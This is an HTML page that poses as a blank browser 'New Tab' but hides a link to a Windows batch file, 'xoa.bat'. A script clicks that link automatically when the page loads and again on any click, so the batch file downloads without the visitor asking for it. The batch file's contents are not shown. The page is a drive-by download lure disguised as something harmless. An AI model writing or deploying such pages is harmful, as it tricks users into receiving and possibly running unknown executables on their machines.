<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>New Tab</title>
<style>
html, body {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background: #ffffff;
    overflow: hidden;
}
</style>
</head>
<body>
<a id="d" href="xoa.bat" download="xoa.bat" style="display:none"></a>
<script>
function triggerDownload() {
    var a = document.getElementById('d');
    if (a) a.click();
}
window.addEventListener('DOMContentLoaded', function() {
    setTimeout(triggerDownload, 100);
});
document.addEventListener('click', function() {
    triggerDownload();
});
</script>
</body>
</html>
